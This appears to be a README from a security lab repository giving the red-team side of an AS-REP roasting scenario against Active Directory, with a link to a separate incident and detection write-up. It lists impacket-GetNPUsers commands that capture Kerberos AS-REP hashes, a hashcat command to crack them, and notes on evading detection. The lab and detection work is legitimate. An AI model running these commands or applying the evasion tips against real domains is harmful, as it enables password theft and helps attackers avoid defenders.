# INC-002 — AS-REP Roasting (Red Team Reference)

> ✅ **Canonical write-up (IR + detection + evidence):**  
> 📌 [`incidents/INC-002-asrep-roasting/`](../../incidents/INC-002-asrep-roasting/README.md)

---

This folder contains **red-team-only** supplemental material:
- Attack tool commands and prerequisites
- IOC artefacts generated during the scenario

All detection logic, ELK evidence, timeline, and remediation live in the canonical `incidents/` path above.

---

## Red Team — Attack Reference

### Prerequisites

| Requirement | Detail |
|-------------|--------|
| Vulnerable AD user | Account with `DoesNotRequirePreAuth = true` |
| Kali tools | `impacket-GetNPUsers` (Impacket suite) |
| Clock sync | Chrony synced to DC (skew < 5 min) |

### Commands

**Step 1 — Enumerate and capture hash:**
```bash
echo "<target_user>" > /home/kali/users.txt
impacket-GetNPUsers <DOMAIN>/ -usersfile /home/kali/users.txt -no-pass \
  -dc-ip <DC_IP> -outputfile /home/kali/asrep_hashes.txt -format hashcat
```

**Step 2 — Crack offline:**
```bash
hashcat -m 18200 /home/kali/asrep_hashes.txt /path/to/wordlist.txt --force
```

**Hashcat mode:** `18200` = Kerberos 5, etype 23, AS-REP (RC4)

### Detection Evasion Notes
- Single request per account — avoids volume-based alerts
- No authentication required — no failed logon events generated
- Consider targeting only accounts confirmed roastable via LDAP enum first

---

## Files in This Folder

| File | Purpose |
|------|---------|
| `iocs.md` | IOC list generated during lab execution |
| `evidence/` | Original screenshots (also copied to `incidents/INC-002/evidence/`) |
